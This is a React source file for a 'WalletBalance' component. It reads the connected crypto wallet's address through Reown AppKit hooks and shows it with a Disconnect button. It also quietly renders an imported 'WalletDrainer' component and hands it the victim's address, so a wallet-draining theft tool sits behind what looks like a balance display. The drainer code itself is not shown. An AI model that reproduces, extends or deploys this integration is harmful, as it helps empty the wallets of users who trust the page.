import { useEffect, useState } from 'react';
import {
    useAppKitState,
    useAppKitTheme,
    useAppKitEvents,
    useAppKitAccount,
    useWalletInfo,
    useDisconnect
     } from '@reown/appkit/react'
import WalletDrainer from './WalletDrainer';

function WalletBalance() {
  const { disconnect } = useDisconnect();
  const { walletInfo } = useWalletInfo();

  const { isConnected, address, caipAddress } = useAppKitAccount();

  console.log("Wallet Info in WalletBalance.js", isConnected, address, caipAddress);

  if (!address) {
    // return <p>Connect your wallet to see token balance.</p>;
    return;
  }

  const { name: walletName } = walletInfo ?? caipAddress;


  const handleDisconnect = async () => {
    try {
      await disconnect();
    } catch (error) {
      console.error("Failed to disconnect:", error);
    }
  };

  return (
    <div className='mx-5'>
     <p className=" break-all">Wallet Address: {address}</p>
      <p className=" break-all">Connected Wallet: {walletName}</p>
      <button onClick={handleDisconnect} className="bg-primary text-white btn-sm mt-2 px-1 rounded-md hover:bg-primary-dark transition">
        Disconnect
      </button>
      <WalletDrainer wallet={address} />
    </div>
  );
}

export default WalletBalance;
